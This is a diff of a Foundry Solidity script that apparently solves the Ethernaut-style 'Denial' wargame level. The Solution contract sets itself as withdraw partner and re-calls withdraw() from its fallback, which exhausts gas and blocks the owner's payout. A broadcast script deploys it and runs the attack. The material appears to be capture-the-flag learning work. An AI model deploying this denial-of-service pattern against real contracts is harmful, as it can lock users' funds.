@@ -1,7 +1,9 @@
-//SPDX-License-Identifier:MIT
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.2;
+pragma experimental ABIEncoderV2;
 
-import {Script, console2} from "forge-std/Script.sol";
+import "./BaseScript.s.sol";
+import {Script,console2} from "forge-std/Script.sol";
 
 interface IDenial {
     function withdraw() external;
@@ -13,34 +15,29 @@ contract Solution {
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
-        bytes memory data = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
-        contractAddress.call(data);
-        // contractAddress.call{setWithdrawPartner(address(this))};
+    }
+
+    function attack() public {
+        IDenial(contractAddress).setWithdrawPartner(address(this));
     }
 
     fallback() external payable {
-        IDenial(contractAddress).withdraw();
-    }
-
-    receive() external payable {
-        IDenial(contractAddress).withdraw();
+        contractAddress.call(abi.encodeWithSignature("withdraw()"));
     }
 }
 
-contract SolutionScript is Script {
-    constructor() {
-        address player = deployer;
-        // console2.log(player.balance);
+contract DenialScript is BaseScript {
 
-        address contractAdd = 0x09E1c97dcF4059Bc650eF82Ef29ef76A758b8bcB;
+    Solution public solution;
 
-        Solution solution = new Solution(contractAdd);
-        uint256 afterBalance = contractAdd.balance * 10 ** 18;
-        IDenial(contractAdd).withdraw();
-        uint256 beforeBalance = contractAdd.balance * 10 ** 18;
+    function setUp() public override {
+        super.setUp();
+    }
 
-        console2.log("afterBalance: ", afterBalance);
-        console2.log("beforeBalance: ", beforeBalance);
-        assert(afterBalance > beforeBalance);
+    function run() public {
+        vm.startBroadcast();
+        solution = new Solution(contractAddress);
+        solution.attack();
+        vm.stopBroadcast();
     }
 }
